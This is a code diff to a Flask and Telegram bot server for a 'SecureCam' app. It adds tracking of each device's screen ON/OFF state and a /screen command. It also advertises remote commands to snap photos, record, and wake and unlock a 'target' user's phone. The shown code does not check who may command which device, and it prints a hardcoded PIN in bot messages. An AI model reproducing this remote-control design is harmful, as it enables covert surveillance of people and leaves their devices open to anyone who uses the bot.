@@ -94,6 +94,11 @@ active_rooms = {}
 camera_commands = {}
 camera_control_lock = threading.Lock()
 
+# Screen status store: { username: { status: 'on'/'off', updated_at: timestamp } }
+# Updated by SecureCam app via heartbeat, read by bot /screen command
+screen_status_store = {}
+screen_status_lock = threading.Lock()
+
 # ============ SQLITE DATABASE FOR CYBER ID & FRIENDS ============
 import sqlite3
 
@@ -248,6 +253,7 @@ def auth_login():
 def user_heartbeat():
     data = request.json or {}
     username = data.get("username", "").strip().lower()
+    screen_status = data.get("screen_status", "").strip().lower()  # 'on' or 'off'
 
     if not username:
         return jsonify({"error": "Username is required"}), 400
@@ -257,6 +263,15 @@ def user_heartbeat():
     cursor.execute("UPDATE users SET last_seen = ? WHERE username = ?", (time.time(), username))
     conn.commit()
     conn.close()
+
+    # Store screen status if provided
+    if screen_status in ('on', 'off'):
+        with screen_status_lock:
+            screen_status_store[username] = {
+                "status": screen_status,
+                "updated_at": time.time()
+            }
+
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/users/search', methods=['GET'])
@@ -1488,7 +1503,7 @@ You can still use <code>/queue</code> and <code>/job JOB_ID</code>.""")
                         # ====== SECURE CAM REMOTE COMMANDS ======
                         parts = text.split()
                         if len(parts) < 2:
-                            send_telegram_direct(chat_id, "📷 <b>SecureCam Commands</b>\n━━━━━━━━━━━━━━━━━━\n<code>/snap username</code> — Instant photo\n<code>/start_rec username</code> — Start continuous recording\n<code>/stop_rec username</code> — Stop recording\n<code>/arm username</code> — Enable motion detection\n<code>/disarm username</code> — Disable motion detection")
+                            send_telegram_direct(chat_id, "📷 <b>SecureCam Commands</b>\n━━━━━━━━━━━━━━━━━━\n<code>/snap username</code> — Instant photo\n<code>/start_rec username</code> — Start continuous recording\n<code>/stop_rec username</code> — Stop recording\n<code>/arm username</code> — Enable motion detection\n<code>/disarm username</code> — Disable motion detection\n<code>/screen username</code> — 📱 Check screen ON/OFF status\n<code>/add username</code> — 🔥 Wake screen + unlock phone\n<code>/status username</code> — 📊 Camera status")
                             continue
                         target_user = parts[1].strip().lower()
                         cmd_raw = parts[0].strip().lower()
@@ -1508,6 +1523,51 @@ You can still use <code>/queue</code> and <code>/job JOB_ID</code>.""")
                         with camera_control_lock:
                             camera_commands[target_user] = {"action": action, "timestamp": time.time()}
                         send_telegram_direct(chat_id, f"{labels[action]} command sent!\n━━━━━━━━━━━━━━━━━━\n👤 Target: <code>{target_user}</code> ({urow['display_name']})\n⚡ Command applies within a few seconds (camera must be active).")
+                        continue
+
+                    # ====== /screen COMMAND — Check screen ON/OFF status ======
+                    elif text.startswith("/screen"):
+                        parts = text.split()
+                        if len(parts) < 2:
+                            send_telegram_direct(chat_id, "📱 <b>Screen Status Check</b>\n━━━━━━━━━━━━━━━━━━\n<code>/screen username</code> — Check if device screen is ON or OFF\n\nExample: <code>/screen my_room_cam</code>\n\nℹ️ Shows real-time screen status from the SecureCam app.")
+                            continue
+                        target_user = parts[1].strip().lower()
+                        conn = get_db_connection()
+                        cur = conn.cursor()
+                        cur.execute("SELECT username, display_name FROM users WHERE username = ?", (target_user,))
+                        urow = cur.fetchone()
+                        conn.close()
+                        if not urow:
+                            send_telegram_direct(chat_id, f"❌ Cyber ID <code>{target_user}</code> not found in the database.")
+                            continue
+
+                        with screen_status_lock:
+                            screen_info = screen_status_store.get(target_user)
+
+                        if not screen_info:
+                            send_telegram_direct(chat_id, f"📱 <b>Screen Status</b>\n━━━━━━━━━━━━━━━━━━\n👤 User: <code>{target_user}</code> ({urow['display_name']})\n❓ Status: <b>Unknown</b>\n\n⚠️ No screen status received yet. Make sure:\n1. The SecureCam app is open & unlocked (PIN 243)\n2. Heartbeat is reaching the server\n3. Wait a few seconds and try again")
+                        else:
+                            status = screen_info.get("status", "off")
+                            updated = screen_info.get("updated_at", 0)
+                            seconds_ago = int(time.time() - updated)
+                            status_icon = "🟢" if status == "on" else "🔴"
+                            status_text = "ON (Screen Active)" if status == "on" else "OFF (Screen Locked/Dark)"
+
+                            # If no update in last 60 seconds, show warning
+                            if seconds_ago > 60:
+                                reliability = "⚠️ Last update was over a minute ago — may be stale"
+                            else:
+                                reliability = "✅ Real-time status (updated within the last minute)"
+
+                            send_telegram_direct(chat_id,
+                                f"📱 <b>Screen Status</b>\n"
+                                f"━━━━━━━━━━━━━━━━━━\n"
+                                f"👤 User: <code>{target_user}</code> ({urow['display_name']})\n"
+                                f"{status_icon} Status: <b>{status_text}</b>\n"
+                                f"🕐 Last Update: {seconds_ago}s ago\n"
+                                f"━━━━━━━━━━━━━━━━━━\n"
+                                f"{reliability}\n\n"
+                                f"💡 Use <code>/add {target_user}</code> to wake the screen if it's OFF!")
                         continue
 
                     # 2. Handle Media Uploads (Instant Direct CDN link generation without downloading to Koyeb disk!)
